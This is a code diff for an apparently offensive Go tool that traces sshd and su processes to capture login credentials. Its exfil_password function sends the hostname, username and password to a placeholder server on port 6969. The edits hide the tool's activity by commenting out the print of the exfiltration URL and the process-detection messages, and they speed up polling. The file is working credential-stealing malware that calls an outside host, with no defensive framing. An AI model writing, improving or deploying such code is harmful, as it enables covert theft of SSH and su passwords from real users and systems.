@@ -44,7 +44,7 @@ func is_SU_PID(pid int) bool {
 	if err != nil {
 		return false
 	}
-	return regexp.MustCompile(`su `).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
+	return regexp.MustCompile(`^su `).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
 }
 
 func exfil_password(username, password string) {
@@ -52,13 +52,13 @@ func exfil_password(username, password string) {
 	if err != nil {
 		return
 	}
-	serverURL := "http://fill:6969/"
+	serverURL := "http://FILL:6969/"
 	values := url.Values{}
 	values.Set("hostname", hostname)
 	values.Set("username", username)
 	values.Set("password", password)
 	fullURL := fmt.Sprintf("%s?%s", serverURL, values.Encode())
-	fmt.Printf("Sending to %s\n", fullURL)
+	//fmt.Printf("Sending to %s\n", fullURL)
 	http.Get(fullURL)
 }
 
@@ -75,6 +75,7 @@ func main() {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
+					//fmt.Println("SSHD process found with PID:", pid)
 					go traceSSHDProcess(pid)
 					processed_pids = append(processed_pids, pid)
 				}
@@ -83,6 +84,7 @@ func main() {
 				if !processedFirstPID {
 					processedFirstPID = true
 				} else {
+					//fmt.Println("SU process found with PID:", pid)
 					go traceSUProcess(pid)
 					processed_pids = append(processed_pids, pid)
 				}
@@ -90,15 +92,6 @@ func main() {
 
 			processedPIDsMutex.Unlock()
 		}
-		time.Sleep(1 * time.Second)
+		time.Sleep(250 * time.Millisecond)
 	}
-}
-
-func contains(slice []int, value int) bool {
-	for _, v := range slice {
-		if v == value {
-			return true
-		}
-	}
-	return false
 }
